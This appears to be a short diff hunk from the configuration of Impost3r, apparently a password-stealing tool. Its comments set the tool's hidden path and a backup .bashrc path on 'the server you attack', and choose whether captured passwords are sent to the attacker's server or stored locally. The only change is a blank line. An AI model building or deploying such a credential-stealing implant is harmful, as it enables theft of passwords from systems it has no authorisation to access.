@@ -58,6 +58,7 @@ fi
 # define FILENAME "/tmp/.impost3r" \\Set the location where the Impost3r is on the server you attack.
 # define BACKUP_BASHRC "/tmp/.bashrc" \\Set the location where the backup .bashrc is on the server you attack.
 # define SAVE_OR_SEND 0 \\Set the method you want to apply when Impost3r get the password,(send to your server=0,save the result on the current server=1,default is send)
+
 /*
     Send to server
 */
